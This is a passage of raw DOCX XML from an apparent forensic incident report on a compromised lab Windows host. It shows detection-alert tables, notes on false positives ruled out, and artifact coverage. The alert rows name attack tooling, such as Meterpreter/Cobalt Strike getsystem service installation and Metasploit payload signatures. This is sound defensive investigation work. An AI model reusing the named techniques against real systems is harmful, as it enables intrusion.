              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Meterpreter or Cobalt Strike Getsystem Service Installation - System</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>DESKTOP-SDN1RPT.C137.local</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>System</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>7045</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>959</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#105</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2020-09-19 03:43:14.990879</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Zircolite</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Meterpreter or Cobalt Strike Getsystem Service Installation - System</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>DESKTOP-SDN1RPT.C137.local</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>System</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>7045</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>959</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>zircolite/zircolite_timeline_0.jsonl#217</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2020-09-19 03:52:13.992637</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Chainsaw</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>RDP Session Disconnected</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>DESKTOP-SDN1RPT.C137.local</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Microsoft-Windows-TerminalServices-LocalSessionManager/Operational</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>100</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#41</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2020-09-19 04:08:45.783080</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Suricata</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>ET MALWARE Possible Metasploit Payload Common Construct Bind_API (from server)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>10.42.85.115</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>failed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2025644</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>1514871998465440</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_alert.jsonl#455</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2020-09-19 05:10:38.974000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Suspicious Service Path</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>DESKTOP-SDN1RPT.C137.local</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Sys</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>7045</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>994</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#1321</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Appendix C: Working notes (leads ruled out, false positives)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[step 2] Step 2 false positives / benign alerts: (1) Chainsaw 'Suspicious Paths Service Installation' x11 on 2020-09-18 05:41-05:53 and 05:08:59 = Intel e1i65x64, VMware drivers (vsock, vmusbmouse, vmmouse, vmmemctl, vmrawdsk, vm3dmp*), WUDFRd (USB WPD) – OS/VMware Tools install; (2) 'AccessData Driver' C:\Users\RICKSA~1\AppData\Local\Temp\ad_driver.sys 7045 RecordID 994 at 05:10:38 = FTK Imager acquisition (analyst activity, see F-002); (3) Hayabusa 'Suspicious Service Path' Printer Extensions (svchost -k print) = legit; (4) 'Password Reset By Admin'/'User Added To Local Admin Grp'/'Local User Created' 2020-09-18 05:41-05:49 by SYSTEM (defaultuser0, Admin) = OOBE setup; 4732 at 21:42:16 adding Domain Admins (-512) to Administrators = domain join; (5) 'WMI Persistence' 5859 SCM Event Provider MSFT_SCMEventLogEvent = default Windows consumer; (6) MSIX/AppX installs, Credential Manager, firewall settings, Discord SNI/DNS, Microsoft device metadata UA = normal activity. hash_hits empty (no hashset loaded). No Defender 1116/1117 detection events; Defender quarantine/exclusion tables not present. Detection gap: 7045 of service 'coreupdater' (System32 path) not flagged by any engine.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[step 3] Step 3 benign/context executions reviewed and excluded: WSCRIPT.EXE 01:08:25 loading C:\Windows\System32\slmgr.vbs (local Admin -1001, Windows activation) with cmd.exe 01:07:56/01:08:19; IPCONFIG.EXE 03:13:21 (via cmd 03:13:21, coincides with network profile change; user not attributable - no 4688); OneDriveSetup/FileSyncConfig per-profile first-logon installs (ShimCache/PCA); MpCmdRun/MsMpEng/AM_Delta Defender updates; NGEN/MSCORSVW 01:34-01:35; VMware tools; TASKKILL 22:52:53 (Defender platform update window); responder tools SnippingTool 05:09:09, msinfo32 05:09:13, FTK Imager 05:09:56 (E:\FTK Imager, SHA1 32756b3a319340c4b7fead410d3f36e503b30da2) under ricksanchez. ShimCache has no entry for coreupdater.exe (cache last flushed at shutdown before 01:24 boot) - expected, not evidence of absence. MUICache contains only system resource strings. Amcache has no other non-Microsoft/unsigned binaries in user-writable paths. vol_cmdscan conhost PID 728 history empty.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[step 5] PCAP noise qualified (step 5): 'ET USER_AGENTS Microsoft Device Metadata Retrieval Client' and 'ET INFO Windows OS Submitting USB Metadata' (10.42.85.115 → Microsoft IPs, port 80) = normal Windows device metadata. 'ET INFO Observed Discord Domain' at ~22:05 pcap-UTC = user browsing, no further link. 10.90.90.90:443 (354 TLS flows, cert subject CN=CN_DNSBL / dnsbl@example.com self-signed) = DNS-blackhole/ad-block sinkhole of the lab gateway answering blocked ad/telemetry domains — environment, not malicious. SMB from 10.42.85.115 only to CITADEL-DC01 (SYSVOL GPO reads, NETLOGON/IPC$ at RDP logon, \\CITADEL-DC01\FileShare at 04:08 pcap = ricksanchez logon 05:08 host) — no lateral movement from the workstation observed. Capture window: 2020-09-18 21:58:07 → 2020-09-19 05:38:57 pcap-UTC (≈22:58 → 06:38 host-UTC due to the ~1 h pcap offset); host events before ~22:58 host-UTC on 2020-09-18 are not visible on the network.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[step 6] Step 6 persistence – reviewed and ruled out as benign: Scheduled tasks created in the window are \CreateExplorerShellUnelevatedTask (03:36:26, Explorer /NOUACCHECK, created at RDP logon), OneDrive Standalone Update Task for SIDs -500/-1106/-1108/-1001, GroupPolicy tasks {A7719E0F...}/{3E0A038B...} (gpupdate /target:user, author DESKTOP-SDN1RPT$), UpdateOrchestrator/Defender/Defrag re-registrations. Memory scheduled_tasks: same, plus COM-handler tasks. No 4698/4702 (Security auditing of task creation not enabled). HKCU Run values are only OneDrive; HKCU RunOnce of Administrator = OneDrive "Delete Cached Update Binary" (03:37:34, legitimate). Winlogon: no Shell/Userinit anomaly in parsed outputs. AppInit_DLLs empty (dissect_appinit path '.'). Active Setup StubPaths are Microsoft (unregmp2, ie4uinit, mscories). Print Monitors are the Microsoft defaults (AppMon, localspl, FXSMON, tcpmon, usbmon, APMon), Print Processor winprint.dll. BootExecute = autocheck autochk *, SetupExecute empty. WMI 5861 = only the built-in "SCM Event Log Filter" → NTEventLogEventConsumer. hosts file unchanged (LastModified 2019-12-07). Startup folders: no entries in $MFT. Services written after boot: ad_driver (FTK Imager, 05:10:38), USBSTOR/WUDFWpdFs/WpdUpFltr (responder USB 05:08:58), IndirectKmd/terminpt/WUDFRd (RDP session 03:36:23), BITS start-type toggles 7040 (Windows Update), per-user *_b3e3d7 services (logon 05:08:15). Not available in this DB: dissect_tasks, dissect_clsid_user, dissect_cim_consumerbindings, native_startup, native_hosts, dissect_msoffice_startup tables (COM hijack and WMI repository not directly verifiable). PendingFileRenameOperations not in parsed outputs.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[step 9] Step 9 noise and leads ruled out:</w:t>
        <w:br/>
        <w:t>- Large $J bursts at 03:36:24-03:37:34 are the creation of the new Administrator profile (NTUSER.DAT, known folders), tsprint RDP printer redirection, and the per-user OneDrive install/cleanup (PathUnknown dir 0x5FC6). This is standard first-logon activity.</w:t>
        <w:br/>
        <w:t>- MicrosoftEdgeBackups at 03:39:18 is Edge's first-run backup.</w:t>
        <w:br/>
        <w:t>- The $Extend\$Deleted entries at 03:52:12-03:52:14 are POSIX deletes of open files at profile unload (logoff).</w:t>
        <w:br/>
        <w:t>- TypedURLs only holds the default go.microsoft.com value.</w:t>
        <w:br/>
        <w:t>- WordWheelQuery and EMDMgmt are absent. TypedPaths has a LastWrite of 03:45:08 but no parsed values.</w:t>
        <w:br/>
        <w:t>- Windows Timeline clipboard payloads are empty (cloud clipboard not enabled).</w:t>
        <w:br/>
        <w:t>- Memory cmdscan/consoles are empty for conhost PID 728.</w:t>
        <w:br/>
        <w:t>- The mortysmith activity on 2020-09-18 22:46-23:09 is legitimate: files created, Edge browsing of reddit/wikipedia/fandom, Portal_gun.png and Jessica.jpg saved. This is the pre-incident baseline that created the files later collected.</w:t>
        <w:br/>
        <w:t>- The tables dissect_thumbcache, dissect_windowsnotepad_tabs, recyclebin and dissect_mru_* are not present in this database. Thumbcache and Notepad tabs could not be checked (Windows 10 19041 has no tabbed Notepad anyway).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[step 10] Step 10 (web/e-mail) coverage &amp; leads ruled out: no browser-history parser output exists in the DB (no chromium_*/firefox_*/hindsight/dissect_browser_*/iexplore tables; legacy Edge WebCache/spartan.edb not parsed) — browsing reconstructed from Windows Timeline, SIDR activity, Suricata HTTP/TLS, $UsnJrnl and OpenSave MRU. TypedURLs only contain the default go.microsoft.com fwlink. No search-engine queries revealing intent were recoverable (Bing traffic is TLS). mortysmith Edge browsing 2020-09-18 ~23:00-23:07 UTC (Bing images Rick&amp;Morty 'Jessica', cnn.com) produced Pictures\Jessica.jpg and Documents\Portal_gun.png (Zone.Identifier ZoneId=3, no HostUrl) — benign user activity; Portal_gun.png was later collected by the attacker (F-013/F-026). Edge backup files with ZoneId=3 in MicrosoftEdgeBackups are normal Edge behaviour. vol_ads entries for autorunsc.exe/autorunsc64.exe with ReferrerUrl C:\Users\James\Downloads\SysinternalsSuite.zip are MFT records found in memory with no matching $MFT entry on the C: volume (no 'James' profile) — most likely responder tooling/foreign volume residue, not attacker activity. No e-mail client stores (.pst/.ost/.eml/.msg, Outlook, Mail app) on disk: e-mail vector excluded with available data.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[step 11] Step 11 false positives / ruled out: (1) raw.mft SI&lt;FN hits = OS image deployment (FN created 2020-09-18 06:35–06:38) on directories and System32 DLLs, and uSecZeros on Search ConstraintIndex / wct*.tmp files with vendor timestamps – not timestomping. (2) $J FileDelete bursts 03:16 (appx/Store package cleanup at Admin logoff), 03:37 (OneDrive per-user setup for Administrator), 03:52 (Edge/Search cache at RDP logoff), 05:09 (python App Execution Alias for ricksanchez) – benign. (3) EventID 1102/104/1100 in non-Security/System channels are unrelated provider IDs. (4) 4616/Kernel-General 1 = W32Time (svchost, 0x3E5) and VM resume hardware clock sync 03:13:20 (gap 01:54:39→03:13:20). (5) vol_malfind MsMpEng.exe PID 2404 RWX region without MZ = Defender FP; vol_suspicious_threads non-file-backed starts in Edge, SearchApp, svchost, WmiPrvSE, OneDrive, explorer, msdtc = common FP (JIT/paged images). raw.dissect_defender_exclusions not present; exclusions checked via registry and MPLog (empty).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[step 12] Step 12 ruled out/benign: BITS jobs = OneDrive UpdateBinary/PreSignInSettingsConfigJSON only (oneclient.sfx.ms, g.live.com); OneDrive never signed in (ODL UX.RequiredSignIn), OneDrive SyncEngineDatabase.db not parsed (limitation, but no sign-in so no sync); large outbound TLS = Microsoft (bing, displaycatalog, oneclient.sfx.ms 39 MB download, v10.events.data.microsoft.com 180 KB telemetry at 01:44 host, browser.events.data.msn.com); DoSvc 13.6 MB sent = Delivery Optimization (pre-incident 22:56-01:54); Firewall 2004/2006 = per-user AppX/Cortana/Skype rules at profile creation; no 5156/Sysmon network telemetry; no long DNS queries; no SMB writes; no archiver/transfer tool prefetch. No dissect_sevenzip table present.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Appendix E: Artifact coverage</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2835"/>
        <w:gridCol w:w="1417"/>
        <w:gridCol w:w="1134"/>
        <w:gridCol w:w="1020"/>
        <w:gridCol w:w="1701"/>
        <w:gridCol w:w="1701"/>
      </w:tblGrid>
      <w:tr>
        <w:trPr>
          <w:tblHeader w:val="true"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Artifact</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Tool</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Mapping</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Events</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>First (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Last (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>MFTECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>438646</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2001-01-01 00:00:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:18:58.950874</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Memory: MFT records in memory</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Volatility 3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>175764</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2013-02-04 23:20:16</w:t>
            </w:r>
          </w:p>
